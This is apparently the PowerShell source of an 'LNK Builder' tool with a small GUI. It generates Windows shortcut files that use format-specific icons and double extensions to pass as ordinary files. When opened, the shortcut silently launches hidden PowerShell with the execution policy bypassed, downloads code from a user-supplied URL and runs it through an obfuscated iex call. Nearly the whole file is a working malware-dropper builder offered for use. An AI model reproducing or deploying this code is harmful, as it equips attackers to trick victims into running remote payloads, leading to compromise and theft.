Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework

Write-Host ' ___      _____  ___   __   ___                                          
|"  |    (\"   \|"  \ |/"| /  ")                                         
||  |    |.\\   \    |(: |/   /                                          
|:  |    |: \.   \\  ||    __/                                           
 \  |___ |.  \    \. |(// _  \                                           
( \_|:  \|    \    \ ||: | \  \                                          
 \_______)\___|\____\)(__|  \__)                                         
                                                                         
 _______   ____  ____  ___        __     ________    _______   _______   
|   _  "\ ("  _||_ " ||"  |      |" \   |"      "\  /"     "| /"      \  
(. |_)  :)|   (  ) : |||  |      ||  |  (.  ___  :)(: ______)|:        | 
|:     \/ (:  |  | . )|:  |      |:  |  |: \   ) || \/    |  |_____/   ) 
(|  _  \\  \\ \__/ //  \  |___   |.  |  (| (___\ || // ___)_  //      /  
|: |_)  :) /\\ __ //\ ( \_|:  \  /\  |\ |:       :)(:      "||:  __   \  
(_______/ (__________) \_______)(__\_|_)(________/  \_______)|__|  \___) 
                                                                         
'-ForegroundColor Green
Write-Host '
[+] https://github.com/ClickCyber/lnk-builder/ReadMe.md
[+] LNK Builder Create Shortcut File With Multiplite Formats
[+] you can add/remove Formats Read The ReadMe.md File for more info
' -ForegroundColor Blue
function LNK-Builder
{
    Param(
    [String]$url,
    [String]$type
    )
    
    $payload = "(New-Object System.Net.WebClient).downloadstring('{0}') | i`e`x" -f $url
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
    $EncodedPayload =[Convert]::ToBase64String($Bytes)
    $DateTime = (Get-Date).ToUniversalTime()
    $UnixTimeStamp = [System.Math]::Truncate((Get-Date -Date $DateTime -UFormat %s))
    $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $utf8 = new-object -TypeName System.Text.UTF8Encoding
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($UnixTimeStamp)))
    $hash = $hash.ToLower() -replace '-', ''
    $ShortcutPath = (Get-Location).Path + "\\output\\" + $hash + "." +$type + ".lnk"
    $IconLocation = (Get-Location).Path + "\\icon\\" + $type + ".ico"
    $WScriptObj = New-Object -ComObject ("WScript.Shell")
    $shortcut = $WscriptObj.CreateShortcut($ShortcutPath)
    $shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
    $shortcut.IconLocation = $IconLocation
    $shortcut.Arguments = '/c powershell.exe -WindowStyle hidden -ExecutionPolicy bypass -c "{0}"' -f $payload
    $shortcut.Save()
    [System.Windows.MessageBox]::Show("file is Generated successfully: $ShortcutPath","Builder LNK", "OK", "None")

}

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Builder Shortcut LNK'
$form.Size = New-Object System.Drawing.Size(300,200)
$form.StartPosition = 'CenterScreen'

$okButton = New-Object System.Windows.Forms.Button
$okButton.Location = New-Object System.Drawing.Point(75,120)
$okButton.Size = New-Object System.Drawing.Size(75,23)
$okButton.Text = 'OK'
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)

$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Location = New-Object System.Drawing.Point(150,120)
$cancelButton.Size = New-Object System.Drawing.Size(75,23)
$cancelButton.Text = 'Cancel'
$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.CancelButton = $cancelButton
$form.Controls.Add($cancelButton)

$TextBox = New-Object System.Windows.Forms.TextBox
$TextBox.Text = "URL PowerShell Code:"
$TextBox.Location = New-Object System.Drawing.Point(10,20)
$TextBox.Size = New-Object System.Drawing.Size(230,50)
$form.Controls.Add($TextBox)

$comboBox = New-Object System.Windows.Forms.comboBox
$comboBox.Text = "Select Format:"
$formats = (Get-ChildItem -Path .\icon\ | Where { !$_.PSIsContainer } | Select Name)
$comboBoxItems = @()
foreach($line in $formats){
    $comboBoxItems += $line.name.substring(0, $line.name.Length-4)
}
$comboBox.Items.AddRange($comboBoxItems);
$comboBox.Location = New-Object System.Drawing.Point(10,50)
$comboBox.Size = New-Object System.Drawing.Size(230,50)
$form.Controls.Add($comboBox)

$form.Topmost = $true
$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK)
{
    $uri = $TextBox.Text
    $typeof = $comboBox.SelectedItem.ToString()
    LNK-Builder -url $uri -type $typeof
}